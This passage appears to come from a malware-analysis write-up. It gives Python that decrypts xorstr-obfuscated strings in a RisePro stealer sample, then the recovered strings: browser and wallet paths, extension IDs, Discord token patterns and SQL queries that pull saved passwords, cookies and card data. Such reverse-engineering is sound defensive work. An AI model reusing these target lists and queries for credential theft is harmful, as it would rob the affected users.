out.append(data[i] ^ key[i % len(key)]) return bytes(out) def print_unique_strings(strings): string_dict = {} last_string = &#39;&#39; for s in strings: if last_string != s[1]: string_dict[s[0]] = s[1] last_string = s[1] print(f&quot;Found strings: {len(string_dict.keys())} n&quot;) for o in string_dict.keys(): print(f&quot;{hex(o)} {string_dict[o]}&quot;) def get_imm_data_recursive(instructions, opr, displacement=0): logger.debug(f&quot;get_imm_data_recursive: {opr}, displacement={displacement}&quot;) # Sanity check if opr.type != X86_OP_MEM and opr.type != X86_OP_REG: logger.debug(f&quot;ERROR Operand type is not X86_OP_MEM or X86_OP_REG&quot;) return None # Determin the operand type # If the operand is a memory address search with displacement else search with register name instruction_count = len(instructions) for ptr in range(instruction_count): inst = instructions[ptr] logger.debug(f&quot;recursive testing {inst} at {hex(inst.address)} &quot;) # If the opr memory we are searching for is ESP then we need to check for stack changes if opr.type == X86_OP_MEM and opr.value.mem.base == X86_REG_ESP and inst.mnemonic == &#39;sub&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[0].reg == X86_REG_ESP: if ptr+1 &lt; instruction_count and instructions[ptr+1].mnemonic == &#39;call&#39;: logger.debug(f&quot;Assuming stack change is for call at {hex(inst.address)}&quot;) else: if inst.operands[1].type != X86_OP_IMM: logger.debug(f&quot;ERROR: Expected immediate value for stack change&quot;) return None displacement -= inst.operands[1].value.imm logger.debug(f&quot;{hex(inst.address)}: sub esp New displacement: {hex(displacement)}&quot;) if opr.type == X86_OP_MEM and opr.value.mem.base == X86_REG_ESP and inst.mnemonic == &#39;add&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[0].reg == X86_REG_ESP: if inst.operands[1].type != X86_OP_IMM: logger.debug(f&quot;ERROR: Expected immediate value for stack change&quot;) return None displacement += inst.operands[1].value.imm logger.debug(f&quot;{hex(inst.address)}: add esp New displacement: {hex(displacement)}&quot;) if opr.type == X86_OP_MEM and opr.value.mem.base == X86_REG_ESP and inst.mnemonic == &#39;push&#39;: displacement -= 4 logger.debug(f&quot;{hex(inst.address)}: push New displacement: {hex(displacement)}&quot;) if opr.type == X86_OP_MEM and opr.value.mem.base == X86_REG_ESP and inst.mnemonic == &#39;pop&#39;: displacement += 4 logger.debug(f&quot;{hex(inst.address)}: pop New displacement: {hex(displacement)}&quot;) # Track the movs to see if they have the memory/register we are looking for if inst.mnemonic == &#39;mov&#39;: if opr.type == X86_OP_MEM and inst.operands[0].type == X86_OP_MEM: inst_op_mem = inst.operands[0].value.mem if inst_op_mem.disp == opr.value.mem.disp + displacement and inst_op_mem.base == opr.value.mem.base and inst_op_mem.index == opr.value.mem.index and inst_op_mem.scale == opr.value.mem.scale: logger.debug(f&quot;Found mov mem for our mem at {hex(inst.address)}&quot;) if inst.operands[1].type == X86_OP_IMM: return inst.operands[1].value.imm else: return get_imm_data_recursive(instructions[ptr:], inst.operands[1]) elif opr.type == X86_OP_REG and inst.operands[0].type == X86_OP_REG: if inst.operands[0].reg == opr.reg: logger.debug(f&quot;Found mov reg for our reg at {hex(inst.address)}&quot;) if inst.operands[1].type == X86_OP_IMM: return inst.operands[1].value.imm else: return get_imm_data_recursive(instructions[ptr:], inst.operands[1]) elif inst.mnemonic == &#39;lea&#39;: if opr.type == X86_OP_REG and inst.operands[0].type == X86_OP_REG: if inst.operands[0].reg == opr.reg: logger.debug(f&quot;Found lea reg for our reg at {hex(inst.address)}&quot;) if inst.operands[1].type == X86_OP_MEM: return get_imm_data_recursive(instructions[ptr:], inst.operands[1]) return None def get_string_from_pxor_ex(instructions, xor_reg, xor_mem): # Get the memory address moved into the xor_reg xor_reg_mem = None xor_reg_mem_offset = 0 for ptr in range(len(instructions)): inst = instructions[ptr] logger.debug(f&quot;Testing {hex(inst.address)}&quot;) if inst.mnemonic[:3] == &#39;mov&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[0].reg == xor_reg.reg: if inst.operands[1].type != X86_OP_MEM: logger.debug(f&quot;Error mov xor_reg is not a memory address at {hex(inst.address)}: {inst.op_str}&quot;) return None else: # Get the memory address moved into the xor_mem logger.debug(f&quot;Found mov xor_reg at {hex(inst.address)}: {inst.op_str}&quot;) xor_reg_mem = inst.operands[1] xor_reg_mem_offset = ptr break if xor_reg_mem is None: logger.debug(f&quot;Error mov xor_reg not found&quot;) return None # Break xor_reg_mem memory base into 4 DWORD chunks logger.debug(&quot;Getting data chunks for xor_reg_mem&quot;) op_mem = xor_reg_mem.value.mem op_disp = op_mem.disp op_base = op_mem.base op_index = op_mem.index op_scale = op_mem.scale logger.debug(f&quot;op_disp:{op_disp} op_base:{op_base} op_index:{op_index} op_scale:{op_scale}&quot;) data1 = b&#39;&#39; for i in [0, 4, 8, 12]: tmp_chunk = get_imm_data_recursive(instructions[xor_reg_mem_offset:], xor_reg_mem, displacement=i) if tmp_chunk is None: logger.debug(f&quot;Error no imm found for xor_reg_mem {xor_reg_mem} at displacement {i}&quot;) return None logger.debug(f&quot;data1 chunk: {hex(tmp_chunk)}&quot;) data1 += struct.pack(&#39;&lt;I&#39;, tmp_chunk) # Recursive scan for each chunk and get the imm value data2 = b&#39;&#39; for i in [0, 4, 8, 12]: tmp_chunk = get_imm_data_recursive(instructions, xor_mem, displacement=i) if tmp_chunk is None: logger.debug(f&quot;Error no imm found for xor_mem {xor_mem} at displacement {i}&quot;) return None logger.debug(f&quot;data2 chunk: {hex(tmp_chunk)}&quot;) data2 += struct.pack(&#39;&lt;I&#39;, tmp_chunk) out = xor(data1, data2) logger.debug(out) out = out.replace(b&#39; x00&#39;,b&#39;&#39;) if len(out) == 0: return None #print(out.decode(&#39;utf-8&#39;)) if not is_ascii(out): return None return out.decode(&#39;utf-8&#39;) def get_strings(filename): # Capstone setup md = Cs(CS_ARCH_X86, CS_MODE_32) md.detail = True md.skipdata = True # Get code from PE pe = pefile.PE(filename) # Assume the first section is code txt = pe.sections[0] image_base = pe.OPTIONAL_HEADER.ImageBase section_rva = txt.VirtualAddress section_offset = txt.PointerToRawData section_data = txt.get_data() strings = [] pxor_vpxor_vxorps_egg = rb&#39;( x66 x0F xEF| xC5 xFD xEF| xC5 xF8 x57)&#39; for m in re.finditer(pxor_vpxor_vxorps_egg, section_data, re.DOTALL): xor_start = m.start() # Determine the instruction length xor_instruction = list(md.disasm(section_data[xor_start:xor_start+0x10], image_base + section_rva + xor_start))[0] xor_instruction_address = image_base + section_rva + xor_start # if xor_instruction_address != 0x09910F2: # continue if xor_instruction.mnemonic != &#39;pxor&#39; and xor_instruction.mnemonic != &#39;vpxor&#39; and xor_instruction.mnemonic != &#39;vxorps&#39;: #print(f&quot;Found {xor_instruction.mnemonic} instead of pxor&quot;) continue xor_len = xor_instruction.size if xor_instruction.operands[0].type == X86_OP_REG and xor_instruction.operands[1].type == X86_OP_REG: # Skip xor reg, reg continue if xor_instruction.operands[0].type != X86_OP_REG or xor_instruction.operands[1].type != X86_OP_MEM: # Skip anything that is not xor reg, [mem] continue scan_length = 0x2000 if scan_length &gt; xor_start: scan_length = xor_start instructions = [] for inst in md.disasm(section_data[xor_start-scan_length:xor_start], xor_instruction_address - scan_length): instructions.append(inst) logger.debug(f&quot;checking {len(instructions)} instructions&quot;) if xor_instruction.mnemonic == &#39;pxor&#39;: logger.debug(f&quot;Testing pxor at {hex(xor_instruction_address)}, {xor_instruction}&quot;) tmp_string = get_string_from_pxor_ex(instructions[::-1], xor_instruction.operands[0], xor_instruction.operands[1]) #tmp_string = get_string_from_pxor_xmm(instructions[::-1], xor_instruction.operands[0], xor_instruction.operands[1]) if tmp_string is not None: strings.append((xor_instruction_address,tmp_string)) return strings filename = &#39;/tmp/xorstr/work/rise.bin&#39; t = time.time() strings = get_strings(filename) # Benchmark 50.47584390640259 metastealer print(f&quot;Benchmark {time.time() - t}&quot;) ss= string_builder(strings) print(f&quot;Strings recovered: {len(ss)}&quot;) print_unique_strings(ss) print(&quot;done&quot;) . Benchmark 40.022075176239014 Strings recovered: 739 Found strings: 661 0x4010ec 0.1 0x4011ab 50500 0x4064ef RisePro Telegram: https://t.me/RiseProSUPPORT 0x458e88 winhttp.dll 0x458f88 wininet.dll 0x459060 LocalSimbl 0x459123 LocalSimba 0x459463 grab_screen 0x4594d4 grab_tg 0x459542 grab_ds 0x4595b9 grab_wallets 0x459631 grab_ihistory 0x459717 logins 0x45977b Vault_IE 0x45982f logins 0x4598a4 WindowsCredentials 0x459adb .zip_ 0x459bc0 .zip 0x459df4 screenshot.png 0x459e97 Files 0x459f2f FileZilla 0x45a0eb Plugins 0x45a30a 0x45a526 IndexedDB 0x45a59c Sync 0x45a606 Local 0x45a66e 0x45a823 Wallets 0x45aa28 0x45ac41 IndexedDB 0x45acb7 Sync 0x45ad21 Local 0x45ad98 0x45afb0 History 0x45b10f _ 0x45b198 wb.txt 0x45b25f 0x45b4ed url 0x45b5ea time 0x45b7bc CC 0x45b944 _ 0x45b9d6 wb.txt 0x45ba9d 0x45be5d nickname 0x45bed6 name_on_card 0x45bfd0 card_number 0x45c0f5 last_four 0x45c246 **** **** **** 0x45c393 billing_address_id 0x45c46c - 0x45c555 exp_month 0x45c5ce exp_year 0x45c766 expiration_month 0x45c8a0 expiration_year 0x45c931 - 0x45ca9c Name: %s Nickna 0x45cb35 me: %s Month: %s Year: %s Card: %s Address: %s 0x45cdcb Autofill 0x45cf2e _ 0x45cfba wb.txt 0x45d2e7 name 0x45d364 value 0x45d483 %s %s 0x45d5b1 Downloads 0x45d702 _ 0x45d78b wb.txt 0x45d852 0x45dae2 url 0x45dbbb path 0x45ddaf Cookies 0x45df06 _ 0x45df8f ab.txt 0x45e056 0x45e36a domain 0x45e3e3 path 0x45e4db expirationDate 0x45e5eb L! 0x45e666 name 0x45e6df value 0x45e7d6 secure 0x45e858 TRUEFALSE 0x45e924 httpOnly 0x45e9a3 TRUE 0x45ea0d FALSE 0x45eb22 %s %s %s %s %llu %s %s 0x45ed83 _ 0x45ee06 ab.txt 0x45eeca 0x45f157 domain 0x45f2d2 path 0x45f3d4 expirationDate 0x45f465 name 0x45f559 value 0x45f6c9 TRUE 0x45f73c FALSE 0x45f7aa httpOnly 0x45f829 TRUEFALSE 0x45f986 %s %s %s %s %llu %s %s 0x45fb81 wb passwords.txt 0x45fe51 url 0x45fece login 0x45ffce password 0x4600bf profile 0x4602b4 Storage: %s [%s] URL: %s Login: %s Password: %s 0x46058c file 0x4605f7 url 0x4606f1 login 0x4607f1 password 0x4608f1 profile 0x460a7e Storage: %s [%s] URL: %s Login: %s Password: %s 0x460c3d wb discord.txt 0x460dfa Storage: %s UserName: %s E-MAIL: %s Token: %s 0x460f6c nss3.dll 0x46225b bhghoamapcdpbohphigoooaddinpkbai 0x462449 nkbihfbeogaeaoehlefnkodbefgpgknn 0x462691 cjelfplplebdjjenllpjcblmjkfcffne 0x46287f kncchdigobghenbbaddojjnnaogfppfj 0x462a82 fihkakfobkmkjojpchpfgcmhfjnmnfpi 0x462c83 nkddgncdjgjfcddamfgcmfnlhccnimig 0x462edb nanjmdknhkinifnkgdcggcfnhdaammmj 0x46307f nlbmnnijcnlegkjjpcfjclmcfggfefdm 0x46328e amkmjjmmflddogmhpjloimipbofnfjih 0x463491 nhnkbkgjikgcigadomkphalanndcapjk 0x463697 cphhlgmgameodnhkjdmkpanlelnlohao 0x46389a fnjhmkhhmkbjkkabndcnnogagogbneec 0x463a9d kpfopkelmapcoipemfendmdcghnegimn 0x463ca0 blnieiiffboillknjnepogjhkgnoapac 0x463ea1 hpglfhgfnhbgpjdenjgmdgoeiappafln 0x4640f9 hnfanknocfeofbddgcijnmhnfnkdnaad 0x46429d jbdaocneiiinmjbjlgalhcelgbejmnid 0x4646af ffnbelfdoeiohenkjibnmadjiehjhajb 0x4648fa fhbohimaelbohpjbbldcngcnapndodjp 0x464afd ibnejdfjmmkpcnlpebklmnkoeoihofec 0x464d00 bfnaelmomeimhlpmgjnjophhpkkoljpa 0x464edf fhilaheimglignddkjgofkcbgekhenbh 0x4650f7 mgffkfbidihjpoaomajlbgchddlicgpn 0x46531e aodkkagnadcbobfpggfnjeongemjbjca 0x465545 fmblappgoiilbgafhjklehhfifbdocee 0x46576c hmeobnfnfcmdkdcmlblgagmfpfboieaf 0x4659d8 dngmlblcodfobpdpecaadgfbcggfjfnm 0x465bff pdadjkfkgcafgbceimcpbkalnfnepbnk 0x465e26 aeachknmefphepccionboohckonoeemg 0x46604d aiifbnbfobpmeekipheeijimdpnlpgpp 0x466270 fnnegphlobjdpkhecapkijjdkgcjhkib 0x466497 lpfcbjknijpeeillifnkikgncikgfhdo 0x4666be aholpfdialjgjfhomihkjbmgjidlcdno 0x4668e5 afbcbjpbpfadlkmhmclhkeeodmamcflc 0x466b0c dmkamcknogkgcdfhhbddcghachkejeap 0x466d33 fhmfendgdocmcbmfikdcogofphimnkno 0x466f5a cnmamaachppnkjgnildpdmkaakejnhae 0x467181 jojhfeoedkpkglbfimdfabpdfjaoolaf 0x4673a8 flpiciilemghbmfalicajoolhkkenfel 0x4675cf cgeeodpfagjceefieflmdfphplkenlfk 0x4677f6 acmacodkjbdgmoleebolmdjonilkdbch 0x467a1d odbfpeeihdkbihmopkbjmoonfanlbfcl 0x467c44 lpilbniiabackdjcionkobglmddfbcjo 0x467e6b bhhhlbepdkbapadjdnnojkbgioiodbic 0x468092 dkdedlpgdmmkkfjabffeganieamfklkm 0x4682b9 hcflpincpppdclinealmandijcmnkbgn 0x4684e0 mnfifefkajgofkcjkemidiaecocnkjeh 0x468707 ookjlbkiijinhpmnjffcofjonbfbgaoc 0x468929 jnkelfanjkeadonecabehalmbgpfodjm 0x468b4e jnlgamecbpmbajjfhmmmlhejkemejdma 0x468e13 kkpllkodjeloidieedojogacfhpaihoh 0x469032 mcohilncbfahbmgdjkbpemcciiolgcge 0x469243 epapihdplajcdnnkdeiahlgigofloibg 0x469454 gjagmgiddbbciopjhllkdnddhcglnemk 0x469665 kmhcihpebfmpgmihbkipmjlmmioameka 0x469883 bgpipimickeadkjlklgciifhnalhdjhe 0x469af4 phkbamefinggmakgklpkljjmgibohnba 0x469d60 ejjladinnckdgjemekebdpeokbikhfci 0x469f87 gojhcdgcpbpfigcaejpfhfegekdgiblk 0x46a1f3 efbglgofoippbgcjepnhiblaibcnclgk 0x46a416 cjmkndjhnagcfbpiemnkdpomccnjblmj 0x46a682 aijcbedoijmgnlmjeegjaglmepbmpkpi 0x46a8a9 egjidjbpglichdcondbcbdnbeeppgdph 0x46ab15 oeljdldpnmdbchonielidgobddffflal 0x46ad7c ilgcnhelpchnceeipipijaljkblbcobl 0x46afe3 imloifkgjagghnnc 0x46b05b jkhggdhalmcnfklk 0x46b44e Local StateLogin Data 0x46bbe9 cookies 0x46bc81 Local StateCookies 0x46bf4f Login Data 0x46c133 Mozilla FirefoxFirefox WaterfoxWaterfox 0x46c3c3 Comodo IceDragonIceDragon 0x46c4c9 berfox 0x46c5aa ogies BlackHaw 0x46c679 Moonchild Productions Pale MoonPale Moon 0x46c785 DiscordDiscord 0x46c81a discordcanaryDiscordCanary discordptbDiscordPTB 0x46c959 discorddevelopmentDiscordDevelopment 0x46ca56 Opera SoftwareOpera 0x46caf4 Google Chrome User DataChrome 0x46cbd5 Microsoft Edge User DataEdge 0x46cced BraveSoftware Brave-Browser User DataBrave 0x46cde7 CryptoTab Browser User DataCryptoTab Battle.netBattle.net 0x46cf71 Chromium User DataChromium 0x46d048 Google(x86) Chrome User DataChrome (x86) 0x46d135 Yandex YandexBrowser User DataYandex 0x46d21f NVIDIA Corporation NVIDIA GeForce ExperienceNVIDIA SteamSteam 0x46d3ef Amigo User User DataAmigo 0x46d4df Iridium User DataIridium 0x46d5c4 MapleStudio ChromePlus User DataChromePlus 0x46d6f0 7Star 7Star User Data7Star 0x46d7dc CentBrowser User DataCentBrowser 0x46d8b5 Chedot User DataChedot 0x46d98b Vivaldi User DataVivaldi 0x46da73 Kometa User DataKometa 0x46db5a Elements Browse 0x46dbc4 Elements Browser 0x46dc63 Epic Privacy Br 0x46dcf8 Epic Privacy Bro 0x46dd87 uCozMedia Uran User DatauCozMedia 0x46dea9 Fenrir Inc Sleipnir5 setting modules ChromiumViewerChromiumViewer 0x46e038 CatalinaGroup Citrio User DataCitrio 0x46e0f3 Coowon Coowon User DataCoowon 0x46e1dd liebao User Datliebao 0x46e2a4 QIP Surf User DtaQIP Surf 0x46e384 Orbitum User DaaOrbitum 0x46e47b Comodo Dragon User DataDragon 0x46e544 Torch User Data 0x46e5af Torch 0x46e625 Comodo User DataComodo 0x46e71b 360Browser Browser User Data360Browser 0x46e7e3 Maxthon3 User DataMaxthon3 0x46e8c2 K-Melon User DataK-Melon 0x46e994 Sputnik Sputnik User DataSputnik 0x46ea87 Nichrome User DataNichrome 0x46eb78 CocCoc Browser User DataCocCoc 0x46ec3a Uran User DataUran 0x46ecfd Chromodo User DataChromodo 0x46edb3 Mail.Ru Atom User DataAtom 0x46ee8c NetboxBrowser User DataNetboxBrowser 0x46f0f1 rule_exceptionsrule_filesrule_folderrule_size_kb 0x46f262 rule_collect_recursv 0x46f301 : 0x46f386 , 0x46f412 %DESKTOP% 0x46f548 %DOCUMENTS% 0x46f683 %USERPROFILE% 0x46f7be %APPDATA% 0x46f8f9 %LOCALAPPDATA% 0x46fa31 %RECENT% 0x46fbea (.-)* 0x46fca1 (.-) 0x46fd44 (.*)(.-)(.-) 0x470047 / 0x4707ca ld_name 0x470890 ld_geo 0x470a69 0x470b12 , 0x470d36 mark_check_cookies 0x470e08 mark_check_passwords 0x470eda mark_check_history 0x470fb6 mark_domains 0x471037 , 0x471217 domain 0x47133e . 0x4715cc domain 0x4716f3 . 0x4718e4 url 0x472087 .exe 0x4720fc . 0x4721c8 exe 0x472259 msi 0x4722ea scr 0x47237b txt 0x47240c doc 0x47249d docx 0x47252e png 0x4725c2 jpg 0x472656 jpeg 0x4726ea bmp 0x47277e bat 0x472818 vbs 0x472a10 exe 0x472a99 . 0x472b1c 0x472c1a https:// 0x472d06 open 0x472ee5 Telegram Desktop 0x473004 tdata 0x473074 rb key_datas 0x473165 *.* 0x473204 rb maps 0x473450 Telegram 0x4734dd tdata 0x473572 key_datas 0x473773 0x473833 maps 0x473896 maps 0x473b1d s 0x473b84 0x473d73 logins 0x473eb6 profile 0x473f69 url 0x47400a login 0x47408b password 0x47410b logins 0x4743fc profile 0x474490 url 0x474548 login 0x474601 password 0x4746b9 logins 0x47482c profile 0x4748c1 url 0x474978 login 0x474a31 password 0x474ad7 logins 0x474bef vaultcli.dll 0x474c68 VaultEnumerateItems 0x474cfd VaultEnumerateVaultsVaultFreeVaultOpenVaultVaultCloseVaultVaultGetItemVaultGetItem 0x474f9e history 0x47504d profiles.ini 0x4750f2 Profile 0x47519d Path 0x475208 0x4752ea / 0x4753c2 0x4754a3 places.sqlite 0x47552b rb 0x47577a SELECT place_id, visit_date FROM 0x475904 (SELECT place_id, visit_date, id FROM moz_historyvisits ORDER BY id DESC LIMIT 2500) ORDER BY id ASC 0x475a59 ) 0x475ae0 SELECT url FROM 0x475b51 moz_places WHERE 0x475bc1 (`id` = 0x475e9f history 0x475fb9 cookies 0x476068 profiles.ini 0x47611f Profile 0x4761e2 Path 0x476267 0x476340 / 0x476426 0x476509 cookies.sqlite 0x476596 rb 0x476741 SELECT host, isHttpOnly, path, isSecure, expiry, name, value FROM moz_cookies 0x476b0b httpOnly 0x476c9e secure 0x476e0e value 0x476ed0 cookies 0x476ffb download_history 0x4770ea profiles.ini 0x4771b6 Profile 0x477276 Path 0x4772f6 0x4773db / 0x4774c1 0x47759d places.sqlite 0x477625 rb 0x4777b8 SELECT place_id, content FROM moz_annos WHERE (`anno_attribute_id` = 1) 0x477980 ) 0x4779f5 SELECT url FROM 0x477a63 moz_places WHERE 0x477ad3 (`id` = 0x477cbd file:/// 0x477edb download_history 0x47802e autofill 0x4780f1 profiles.ini 0x4781a4 Profile 0x478267 Path 0x4782e9 0x4783d1 / 0x4784ba 0x47857c formhistory.sqlite 0x47865f rb 0x478785 SELECT fieldname, value FROM moz_formhistory 0x478a69 autofill 0x478b7c logins 0x478c25 profiles.ini 0x478cd4 Profile 0x478d8f Path 0x478e0f 0x478ed7 logins.json 0x478f5f rb 0x478ff2 signons.sqlite 0x479146 SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins 0x4794cc login 0x479959 formSubmitURL 0x479bd6 logins 0x479e48 NSS_InitNSS_Shutdown 0x479f01 PK11_GetInternalKeySlotPK11_FreeSlot 0x479fe3 PK11_AuthenticatePK11SDR_Decrypt 0x47a281 0x47a433 Local State 0x47a4d6 os_cryptos_cryptencrypted_keyos_cryptencrypted_key 0x47a7a9 Local State 0x47a932 os_crypt 0x47aa2c encrypted_key 0x47aaae os_crypt 0x47ab28 encrypted_key 0x47ac21 0x47ae67 .log 0x47af0c .ldb 0x47b24e dQw4w9WgXcQ:[^.* [&#39;(.*)&#39; ].*$][^&#34;]* 0x47b3fa dQw4w9WgXcQ: 0x47b6f6 discord.com/api/v9/users/@me 0x47b815 usernameemailusername 0x47b930 email 0x47be84 CURRENT Sync Extension Settings 0x47bfed CURRENT Local Extension Settings 0x47c163 _0.indexeddb.leveldb CURRENT IndexedDB chrome-extension_ 0x47c62a Settings Sync Extension 0x47c789 Settings Local Extension 0x47c8f5 e-extension_ IndexedDB chromeldb _0.indexeddb.lev 0x47cad5 CURRENT 0x47cd9d history 0x47cef7 0x47d3f0 SELECT url, last_visit_time FROM(SELECT url, last_visit_time, id FROM urls ORDER 0x47d5a4 BY id DESC LIMIT 2500) ORDER BY id ASC 0x47d942 cookies 0x47dacd Network 0x47dd3f 0x47de18 os_cryptos_cryptencrypted_keyos_cryptencrypted_key 0x47e0da 0x47e29d os_crypt 0x47e397 encrypted_key 0x47e419 os_crypt 0x47e493 encrypted_key 0x47e5d2 Network 0x47e900 SELECT host_key, is_httponly, path, is_secure, expires_utc, name, value, encrypted_value FROM cookies 0x47ed54 httpOnly 0x47eed2 secure 0x47f0f6 v10 0x47f175 v11 0x47f23e value 0x47f529 cards 0x47f682 0x47f92a os_cryptos_cryptencrypted_keyos_cryptencrypted_key 0x47fbfb 0x47fdc4 os_crypt 0x47febe encrypted_key 0x47ff40 os_crypt 0x47ffba encrypted_key 0x4803bc SELECT name_on_card, expiration_ 0x480546 month, expiration_year, card_number_encrypted, origin, billing_address_id, nickname FROM credit_cards 0x4809f6 v10 0x480a72 v11 0x480c18 billing_address_ 0x480f38 SELECT name_on_card, exp_month, 0x4810be exp_year, last_four, nickname, bank_name, card_art_url, status, network FROM masked_credit_cards 0x4814ab last_four 0x4816b7 status 0x481975 download_history 0x481b13 0x481f6f SELECT tab_url, target_path FROM downloads 0x482359 autofill 0x4824b3 0x4828d1 SELECT name, value FROM autofill 0x482cba logins 0x482dfa 0x483080 os_cryptos_cryptencrypted_keyos_cryptencrypted_key 0x483322 0x4834e2 os_crypt 0x4835dc encrypted_key 0x48365e os_crypt 0x4836d8 encrypted_key 0x4839f8 SELECT action_url, origin_url, username_value, password_value FROM logins 0x483cdf v10 0x483d59 v11 0x483e0a profile 0x48414b * 0x48422a 0x484369 v10v11 0x484825 90 0x48489b 3 0x484ac9 freebl3.dllmozglue.dllnss3.dllsoftokn3.dllmsvcp140.dll 0x484cae vcruntime140.dll 0x484d88 0x48541e wb 0x48565d An uncaught exception occurred3: 0x485869 An uncaught exception occurred3. The type was unknown so no information was available. 0x485da0 api.myip.com 0x485e6b ip 0x485f57 cc 0x4860d3 An uncaught exception occurred_ip0_1: 0x486300 An uncaught exception occurred_ip0_1. The type was unknown so no information was available. 0x486460 api64.ipify.org/?format=json 0x486542 ip 0x4866d6 An uncaught exception occurred_ip0_2: 0x486907 An uncaught exception occurred_ip0_2. The type was unknown so no information was available. 0x486a7d ipinfo.io/widget/demo/ 0x486b5c data 0x486c2c country 0x486c96 data 0x486cfb country 0x486d7b data 0x486ddf city 0x486e47 data 0x486eab city 0x486fb6 An uncaught exception occurred_ip1: 0x4871e3 An uncaught exception occurred_ip1. The type was unknown so no information was available. 0x487351 db-ip.com/demo/home.php?s= 0x487430 demoInfo 0x487507 countryCode 0x487574 demoInfo 0x4875dd countryCode 0x487660 demoInfo 0x4876c4 city 0x48772f demoInfo 0x487793 city 0x48789f An uncaught exception occurred_ip2: 0x487acc An uncaught exception occurred_ip2. The type was unknown so no information was available. 0x487c81 www.maxmind.com/geoip/v2.1/city/me 0x487d6c country 0x487ead iso_code 0x487f1a country 0x487f7f iso_code 0x487fe9 city 0x48804e names 0x4880b1 en 0x48811c country 0x488181 iso_code 0x488207 city 0x48826c names 0x4882cf en 0x488405 An uncaught exception occurred_ip4: 0x48863e An uncaught exception occurred_ip4. The type was unknown so no information was available. 0x48874a 1.1.1.1 0x4887b4 ZZ 0x488828 Unknown 0x488af8 0x488d05 msvcp140.dll 0x488d90 vcruntime140.dll 0x488e27 freebl3.dll 0x488e95 mozglue.dll 0x488f00 nss3.dll 0x488f6a softokn3.dll 0x489009 DLL 0x489209 :// 0x489343 mark_name 0x4894c4 atomic Local Storage 0x48955b Atomic 0x489698 Electrum wallets 0x489731 Electrum 0x48985a Exodus exodus.wallet 0x4898f0 Exodus 0x489a19 Electrum-LTC wallets 0x489ab2 ElectrumLTC 0x489b97 Monero wallets 0x489c1d Monero 0x489d43 com.liberty.jaxx 0x489ddf Jaxx Liberty 0x489e62 IndexedDB 0x48a000 Local Storage 0x48a1d3 Session Storage 0x48a442 Jaxx Local Storage 0x48a4d5 Jaxx 0x48a5f8 Coinomi Coinomi wallets 0x48a68b Coinomi 0x48a764 Armory 0x48a90d WalletWasabi Client Wallets 0x48a9a0 Wasabi 0x48aac1 Bither bither.db 0x48ab56 Bither 0x48abce bither.db 0x48acd6 ElectronCash wallets 0x48ad6b ElectronCash 0x48ae90 Binance app-store.json 0x48af25 Binance 0x48afa1 app-store.json 0x48b0a6 Ethereum wallets 0x48b137 Ethereum 0x48b211 Guarda 0x48b310 IndexedDB 0x48b4a6 Local Storage 0x48b673 Session Storage 0x48b8df MultiDoge multidoge.wallet 0x48b97a MultiDoge 0x48ba31 multidoge.wallet 0x48bb0e Bitcoin 0x48bb77 DogecoinAnoncoin 0x48bc38 BBQCoinBBQCoinDashCoreFlorincoinFrankoFreicoin 0x48be71 GoldCoin (GLD) 0x48bed4 IOCoin 0x48bf39 InfinitecoinIxcoin 0x48bffd MegacoinMincoinNamecoin 0x48c123 PrimecoinTerracoinYACoinZcashdevcoindigitalcoin 0x48c35e LitecoinReddcoin 0x48c449 Daedalus Mainnet 0x48c4cb Ledger Live 0x48c629 0x48c6f1 wallet.dat 0x48c7f8 wallet.dat wallet.dat 0x48c90a wallets 0x48c97a 0x48ca1c wallets 0x48cbb7 Authy Desktop 0x48cc64 Authy 0x48ccf7 IndexedDB 0x48ce9a Local Storage 0x48d056 Session Storage 0x48d328 *.* 0x48d689 information.txt 0x48d734 wb 0x48d7c3 Version: %s 0x48d837 Date: %sUnknown 0x48d90d SOFTWARE Microsoft Cryptography 0x48d9cf MachineGuid 0x48da64 MachineID: %s Unknown 0x48db55 GUID: %s ___ 0x48ddcb HWID: %s 0x48de4a Path: %s Work Dir: %s IP: %s 0x48dfac Location: %s, %s 0x48e090 SOFTWARE Microsoft Windows NT CurrentVersion 0x48e17b ProductNamex64x32 0x48e26b Windows: %s [%s] 0x48e36c Computer Name: %s 0x48e41f User Name: %s 0x48e4b2 Display Resolution: %dx%d 0x48e5aa Display Language: %ws Display Language: Unknown 0x48e68a Keyboard Languages: 0x48e78e / %s 0x48e879 Local Time: %d/%d/%d %d:%d:%d 0x48e9c8 TimeZone: UTC%d 0x48ea2e [Hardware] 0x48eac0 HARDWARE DESCRIPTION System CentralProcessor 0 0x48ebf5 ProcessorNameStringProcessor: %s 0x48ecf9 CPU Count: %d 0x48ed73 RAM: %u MB 0x48eed7 VideoCard #%d: %s 0x48efd1 [Processes] 0x48f074 %s [%d] 0x48f0dd [Software] 0x48f198 SOFTWARE Microsoft Windows CurrentVersion Uninstall 0x48f309 %s %s 0x48f3cd DisplayName 0x48f462 DisplayVersion 0x48f4cf %s [%s] 0x48f5b9 wb 0x48f835 %X 0x49000f rb 0x490153 RtlGetVersionNtdll.dll 0x490244 rb 0x490d15 http:/// 0x490dfa ? 0x49128d . 0x4912f3 .dll 0x49135f # 0x491491 WINHTTP.dllWinHttpConnect 0x49154f WinHttpQueryHeadersWinHttpOpen 0x49162a WinHttpOpenRequest 0x4916bd WinHttpQueryDataAvailable 0x49174c WinHttpSendRequest 0x4917df WinHttpReceiveResponseWinHttpReadData 0x4918c2 WinHttpCloseHandle 0x49194e WinHttpSetTimeouts 0x491d1e wb 0x491e39 HEAD 0x4920ed InternetOpenA 0x492159 InternetSetOptionA 0x4921e6 HttpOpenRequestA 0x492273 InternetConnectA 0x492300 InternetOpenUrlA 0x492372 HttpQueryInfoA 0x4923de InternetQueryOptionA 0x49246b HttpSendRequestA 0x4924f8 InternetReadFile 0x492585 InternetCloseHandle done . Speed Optimizations . Instead of iterativly scanning with a regex and disassembling for each pxor instruction we can perform one full scan and then split the binary into chunks that contain all the pxor instructions. These chunks can then be disassembled a single time and the results re-used for each pxor hit. . def get_strings_fast(filename): # Capstone setup md = Cs(CS_ARCH_X86, CS_MODE_32) md.detail = True md.skipdata = True # Get code from PE pe = pefile.PE(filename) # Assume the first section is code txt = pe.sections[0] image_base = pe.OPTIONAL_HEADER.ImageBase section_rva = txt.VirtualAddress section_offset = txt.PointerToRawData section_data = txt.get_data() strings = [] pxor_vpxor_vxorps_egg = rb&#39;( x66 x0F xEF| xC5 xFD xEF| xC5 xF8 x57)&#39; chunk_offsets = [] last_end = 0 for m in 